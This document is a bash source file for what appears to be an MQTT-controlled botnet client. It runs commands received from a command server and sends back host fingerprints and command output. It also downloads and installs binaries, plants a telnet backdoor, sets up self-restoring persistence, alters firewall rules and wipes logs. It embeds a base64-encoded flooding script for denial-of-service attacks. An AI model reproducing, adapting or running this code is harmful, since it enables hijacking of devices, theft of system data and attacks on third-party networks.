# vim: syntax=bash
jsonify(){
jtemp=$(mktemp json.XXXXXX);rm $jtemp
tempf="$workdir/$jtemp"
input="$1"
echo "$2" > $tempf
bbj="$(jshon -Qs 2>/dev/null 1>/dev/null)"
getip=$bbj"$(echo $mq_ip)"
unixtime=$bbj"$(date +%s)"
getdate=$bbj"$(date)"
getuptime=$bbj"$(uptime | sed s/\,//)"
kernelcmdline=$bbj"$(cat /proc/cmdline)"
getid=$bbj"$(id)"
kcrypto=$bbj"$(cat /proc/crypto | grep name | cut -d':' -f2 | uniq | tr -s '\n' ' '|sed s/\,//)"
getversion=$bbj"$(cat /proc/version)"
memstat=$bbj"$(cat /proc/meminfo | head -n 3 | tr -s '\n' ' ')"
getcwd=$bbj"$(pwd)"
defshell=$bbj"$(echo $SHELL)"
getstty=$bbj"$(stty)"
term=$bbj"$(echo $TERM)"
cpuname=$bbj"$(cat /proc/cpuinfo | grep name)"
status=$bbj"$(if ([ -s /tmp/.status ] && [ -f /tmp/.status ]); then echo "SYSTEM_BUSY" ; else echo "SYSTEM_READY";fi)"
hashcmd=$bbj"$(md5sum $tempf |head -c 32)"
uuid=$bbj"'$unixtime.$hashcmd'"
botversion=$bbj"'$(echo $mq_version)'"
output=$bbj"'$($shell $tempf)'"
cmdline=$bbj"$(echo $(cat $input))"

echo '{
"ip" : "'$getip'",
"unixtime": "'$unixtime'",
"date": "'$getdate'",
"uptime" : "'$getuptime'",
"cpuname": "'$cpuname'",
"memstat" : "'$memstat'",
"id" : "'$getid'",
"version" : "'$getversion'",
"kernel_cmdline": "'$kernelcmdline'",
"kernel_crypto": "'$kcrypto'",
"default shell": "'$defshell'",
"current shell": "'$shell'",
"term": "'$term'",
"stty": "'$getstty'",
"cwd": "'$getcwd'",
"uuid": "'$uuid'",
"status": "'$status'",
"bot version: "'$botversion'",
"cmdline": "'$cmdline'",
"output": "'$output'"
}' 2>>$errorlog
rm -f $jtemp
}

# vim: syntax=bash
publish(){
uxt=$(date +%s)
pubtemp=$(mktemp pub.XXXXXX);rm $pubtemp
jshout=$workdir/jshout.$uxt
jshin=$workdir/$pubtemp
[ $mq_debug == "1" ] && echo "[<<] Publishing output to topic $mq_pubtop on $mq_host"
echo "$input" >$jshin
(jsonify "$jshin" "cat $out" | base64) 2>> $errorlog > $jshout
if ([[ "$?" -eq "0" ]] && [[ -s $out ]]); then
  pubclient -h $mq_host -i $mq_ip -q 0 -t "data/$mq_pubtop" -u bot -P $mq_pass -f $jshout
fi
rm -f $out $jshout $jshin 2>>$errorlog
}


# vim: syntax=bash
execute(){
input="$@"
uxt=$(date +%s)
temp=$(mktemp cmd.XXXXXX);rm $temp
piddir=/tmp/.mqsh/pids
_cmd_="${workdir}/${temp}"
printf 'export thrdpid=$(mktemp XXXXXX);rm $thrdpid \necho "$$" > /tmp/.mqsh/pids/${thrdpid}.pid \n' >$_cmd_
echo "$@" >> $_cmd_
out="$workdir/output.${uxt}"
((($shell $_cmd_) ;wait) 2>> $errorlog > $out );\
((if [[ -s $out ]] ; then publish $out "$input"; else rm $out;fi &)&)
for i in `ls $piddir`;do if ! ps|grep `cat $piddir/$i`|grep -v 'grep' >/dev/null 2>&1;then rm $piddir/$i;fi ;done
rm -f $_cmd_
$mq_debug && echo '[<<] Executed command in a thread'
} 

# vim: syntax=bash
repoGet(){
checkhash(){
  bin="$1";fhash="$2"
  if (echo $fhash *$bin | sha1sum -c -) > /dev/null 2>&1 ; then
    return 0
  else 
    return 1
  fi }

getbin="$1"
$mq_debug && echo "Getting hash file of $1"
wget -O /tmp/bin.sha1 $mq_httphost/repo/$getbin.sha1
gethash=$(cat /tmp/bin.sha1)
if ! checkhash $mq_binpath/$getbin $gethash;then 
  rm /tmp/bin.out; 
  for i in $(seq 1 5) ;do 
    $mq_debug && echo "Downloading $getbin from repository..."
    wget -O /tmp/bin.out $mq_httphost/repo/$getbin; 
    if checkhash /tmp/bin.out $gethash;then  
      $mq_debug && echo "Hash matches!"
      break
    else 
      $mq_debug && echo "Corrupted file, wait and try again..."
      sleep $(echo $RANDOM|head -c 2)
    fi
  done 
mv /tmp/bin.out $mq_binpath/$getbin
chmod +x $mq_binpath/$getbin
fi
}

# vim: syntax=bash
clearmem(){
(>$workdir/error.log 
rm -f $workdir/cmd.*
>$cwd/nohup.out
rm -f /var/log/h*
rm -f /tmp/.bd/*) >>$errorlog 2>&1
}

# vim: syntax=bash
ctrl_c(){
echo -en "\n## Caught SIGINT; Clean up and Exit \n"
kill `cat $subpidfile`
rm $pipe $enc $denc $workdir/output* $pidfile $subpidfile
unset mq_host mq_pass mq_path mq_debug key mq_intf mq_subtop mq_pubtop mq_httphost mq_ipthost mq_binpath mq_shell
exit
}

# vim: syntax=bash
quit(){
(rm $pipe $enc $denc $workdir/output*
kill `cat $subpidfile` && rm $subpidfile
unset mq_host mq_pass mq_path mq_debug key mq_intf mq_subtop mq_pubtop mq_httphost mq_ipthost mq_binpath mq_shell
[ $mq_debug == "0" ] && reboot || (rm -f $workdir);exit) >>$errorlog 2>&1
}

# vim: syntax=bash
killThreads(){
$mq_debug && echo '[info] Received killall, killing all threads and messages...'
(for i in $(ls $piddir);do
  echo "Killing $i" >>error.log
  kill -15 $(cat $piddir/$i)
done
for i in $(pgrep -f "$shell /tmp/.mqsh/_cmd_">/dev/null 2>&1);do 
  kill $i 
done
killall pubclient) >>$errorlog 2>&1
}

# vim: syntax=bash
doFirst(){

chmod +x $mq_binpath/mq
if [ ! -f $mq_binpath/bd ]; then (wget -O $mq_binpath/bd $mq_httphost/bd13);fi
chmod +x $mq_binpath/bd
if [ -f $shpidfile ] ; then
   for i in $(pgrep -f 'sh -c' >>$errorlog 2>&1);do
     kill $i >>$errorlog 2>&1
   done
   for i in $(pgrep -f /var/bin/loop >>$errorlog 2>&1);do 
     kill $i >>$errorlog 2>&1
   done
fi

nohup sh -c "while true;do sleep 600;pidof ash >/dev/null 2>&1||start-stop-daemon -p $pidfile -S --exec $mq_shell $mq_binpath/mq ;done" & echo "$!" > $shpidfile
iptables-save >/tmp/ipt.orig
echo 'nameserver 8.8.8.8' >/tmp/resolv.conf
echo 'nameserver 8.8.4.4' >>/tmp/resolv.conf
iptables -I INPUT 1 -p tcp --dport 80 -j DROP
iptables -N ACCESS
iptables -A ACCESS -p tcp --dport 23 ! -s $mq_ipthost -j REJECT
iptables -I INPUT 1 -j ACCESS
iptables -A OUTPUT -d 104.31.0.0/16 -j DROP
iptables-save >/tmp/ipt
>/var/version.${mq_version}
}

# vim: syntax=bash
spitSomeBin(){
cat << EOF > /tmp/dos 

IyEvdmFyL2Jpbi9hc2gKIyBBdXRvRG9TIC0gU2hlbGwgV3JhcHBlciB0byBTZW5kIE11bHRpcGxlIFNwb29mZWQgUGFja2V0cwojIFNoZWxselJ1cyAyMDE2CiMKCm1vZGU9JDEKaXA9JDIKcG9ydD0kezM6LSI4MCJ9CnRocmVhZHM9JHs0Oi0iNSJ9CnNlY3M9JHs1Oi0iMzAifQoKc3RhdGZpbGU9L3RtcC8uc3RhdHVzCgoKI1NFUSgpe2k9MDt3aGlsZSBbWyAiJGkiIC1sdCAxMCBdXTtkbyBlY2hvICRpOyBpPWBleHByICRpICsgMWA7ZG9uZX0KdXNhZ2UoKXsKZWNobyAiIFwKLSMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIy0KIEF1dG8tRG9zIFZlcnNpb24gMy4wCiAgVXNhZ2U6CiAgJDAgW3RhcmdldCBpcF1bcG9ydF1bdGhyZWFkc11bc2Vjc10KICBEZWZhdWx0OiA1IHRocmVhZHMvMzAgc2VjIE1heDogMjAgdGhyZWFkcy8zMDAgc2VjCi0jIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIy0iCn0KCmZpbmlzaCgpewogICAgaWYgW1sgLXMgIiRzdGF0ZmlsZSIgXV07dGhlbgogICAgID4kc3RhdGZpbGUKICAgIGZpCn0KCnRjcCgpewojZWNobyAiJHRoaXNib3QgOiIKcG9ydD0kezI6LSI4MCJ9CnRocmVhZHM9JHszOi0iNSJ9CnNlY3M9JHs0Oi0iMzAifQplY2hvICJIaXR0aW5nICRpcDokcG9ydCBGb3IgJHNlY3Mgc2VjcyB3aXRoICR0aHJlYWRzIHRocmVhZHMgbW9kZSB0Y3AiCnNzeW4yICRpcCAkcG9ydCAkdGhyZWFkcyAkc2VjcyA+L2Rldi9udWxsICYgZWNobyAiJCEiID4gJHN0YXRmaWxlCnNsZWVwICRzZWNzICYmIGZpbmlzaAp9CnVkcCgpewpwb3J0PSR7MjotIjgwIn0KdGhyZWFkcz0kezM6LSI1In0Kc2Vjcz0kezQ6LSIzMCJ9CiNlY2hvICIkdGhpc2JvdCA6IgplY2hvICJIaXR0aW5nICRpcDokcG9ydCBmb3IgJHNlY3Mgc2VjcyB3aXRoICR0aHJlYWRzIHRocmVhZHMgbW9kZSB1ZHAiCnN1ZHAgJGlwICRwb3J0IDEgJHRocmVhZHMgJHNlY3MgPi9kZXYvbnVsbCAmIGVjaG8gIiQhIiA+ICRzdGF0ZmlsZQpzbGVlcCAkc2VjcyAmJiBmaW5pc2gKfQoKa2lsbEl0KCl7CmtpbGwgLTkgYGNhdCAkc3RhdGZpbGVgOyhbICIkPyIgLWVxICIwIiBdKSAmJiBlY2hvICJLaWxsZWQiOz4kc3RhdGZpbGUKfQoKY2hlY2soKXsKCmlmIFtbICEgLWYgJHN0YXRmaWxlIF1dO3RoZW4gdG91Y2ggJHN0YXRmaWxlO2ZpCnN0YXQ9YGNhdCAkc3RhdGZpbGVgCiN0aGlzQm90PWAvc2Jpbi9pZmNvbmZpZyBldGgxIHwgZ3JlcCBNYXNrIHwgY3V0IC1kICc6JyAtZjIgfCBjdXQgLWQgIiAiIC1mMWAKaWYgKFtbICIkaXAiID09ICIiIF1dIHx8IFtbICIkcG9ydCIgPT0gIiIgXV0gfHwgW1sgIiR0aHJlYWRzIiAtZ3QgIjIwIiBdXSB8fCBbWyAiJHNlY3MiIC1ndCAiMzAwIiBdXSApCnRoZW4KdXNhZ2UKZXhpdCAxCmVsc2UgCmlmIFsgLXMgJHN0YXRmaWxlIF0gO3RoZW4KZWNobyBTeXN0ZW0gaXMgYnVzeS4gV2FpdCBhIG1pbnV0ZS4KZXhpdCAxCmZpCmZpCn0KCmNhc2UgJG1vZGUgaW4gLXR8LS10Y3ApCgpjaGVjawp0cmFwIGZpbmlzaCAxIDIgOAp0Y3AgJGlwICRwb3J0ICR0aHJlYWRzICRzZWNzCgo7OwotdXwtLXVkcCkKY2hlY2sKdHJhcCBmaW5pc2ggMSAyIDgKdWRwIGlwICRwb3J0ICR0aHJlYWRzICRzZWNzCgo7OwoKLWt8LS1raWxsKQpraWxsSXQKOzsKKikKZWNobyAiJDAgW21vZGVbLS10Y3AvLS11ZHBdXSBbaXBdIFtwb3J0XSBbdGhyZWFkXSBbc2Vjc10iCjs7CmVzYWMKCmV4aXQK 

EOF

(cat /tmp/dos | base64 -d > $mq_binpath/dos  ; chmod +x $mq_binpath/dos; rm -f /tmp/dos)2>>$errorlog

cat << _EOF_ > $mq_binpath/loop

while true;do
export PATH=$mq_path
sleep 30
if ! pgrep -f "$mq_binpath/mq" >/dev/null 2>&1; then
  killall -9 subclient >/dev/null 2>&1 
  killall  pubclient $mq_shell >/dev/null 2>&1 
  wget -O $mq_binpath/mq $mq_httphost/mq >/dev/null 2>&1
  trap '' 1;umask 0
  exec >/dev/null
  exec 2>/dev/null
  exec 0</dev/null
  start-stop-daemon -p $pidfile -S --exec $mq_shell $mq_binpath/mq
fi
done
_EOF_

chmod +x $mq_binpath/loop
} 

# vim syntax=bash
sendClientHello(){
helloTmp=$workdir/hello
echo "Client $mq_ip Hello: `uptime`"|base64 2>>$errorlog >$hello
if ([ "$?" -eq "0" ] && [ -s $hello ]); then
  pubclient -h $mq_host -i $mq_ip -q 0 -t data/alive -u bot -P $mq_pass -f $hello 2>>$errorlog &
else
  echo 'Error sending hello message!' >>$errorlog
fi
}

customFunc(){
case $@ in
killtn)

for i in $(seq 1 3); do
  if pidof subclient ; then 
    (killall -9 telnetd
    telnetd -l $mq_binpath/bd) >/dev/null 2>&1 &
    if [ "$?" -eq "0" ] ; then
      break
    fi
  else
    sleep 3
  fi
done

;;

esac
}

# vim: syntax=bash
run(){
cd $workdir
denc=$workdir/denc
$mq_debug && echo Host: "$mq_host" ;echo Pass :"$mq_pass" ;echo Debug: "$mq_debug" ;echo Path:"$mq_path"

if [[ ! -p $pipe ]]; then mkfifo $pipe ;fi
(subclient -h $mq_host -q 2 -i $mq_ip -t shell/$mq_ip -t shell/$mq_subtop -u bot -P $mq_pass --will-payload "Client $mq_ip Disconnect" --will-topic data/dead 2>>$errorlog > $pipe) & echo "$!" > $subpidfile
$mq_debug ||customFunc killtn &
sendClientHello &
while read line; do
$mq_debug &&  echo '[>>] Got a command!'
echo "${line}" | base64 -d 2>> $errorlog >$denc
$mq_debug &&  echo '[>>] Echoed line to file.'
if [[ -s "$denc" ]] ; then

case "$(cat $denc)" in
__quit__)
if $mq_debug ; then
  echo '[!] Received quit, bailing...'
  quit >>$errorlog
fi
;;
__update__)
if $mq_debug ; then
  echo '[!] Received update, getting new config...'
fi
kill "$(cat $subpidfile)" >>$errorlog 2>&1
break
;;
__killall__)
if [ mq_debug == "1" ]; then
  echo '[*] Received a killall, getting new config...'
fi
killThreads >/dev/null 2>&1  &
  
;;
_clearmem_)
if $mq_debug ; then 
  echo '[info] Received clearenv, deleting the logs...'
fi
clearmem >/dev/null 2>&1 &
;;

_get_*)
if $mq_debug ; then 
  echo "[*] Received a get, downloading and installing file..."
fi
getcmd="$(cat $denc | sed s'/__get__//')"
repoGet "${getcmd}" >>$errorlog 2>&1  &
;;

_SH_*)
if $mq_debug ; then 
  echo "[*] Received an _SH_ command, will exec..."
fi
shcmd="$(cat $denc|sed s'/_SH_//')"
echo $shcmd 2>/dev/null > /tmp/shcmd
(($shell /tmp/shcmd 2>>$errorlog | base64)|(pubclient -h $mq_host -i $mq_ip -q 0 -t "data/$mq_pubtop" -u bot -P $mq_pass -s;rm -f /tmp/shcmd)& >>$errorlog 2>&1 )&
;;

*)
if $mq_debug ; then 
  echo "[*] Received a command, will exec..."
fi
cmd="$(cat $denc)" ; execute "${cmd}" &
if ([[ "$?" -eq "0" ]] && [[ $mq_debug ]]); then  
echo '[*] Executed the command...'
fi

;;
esac
>$denc
fi
done <$pipe
}
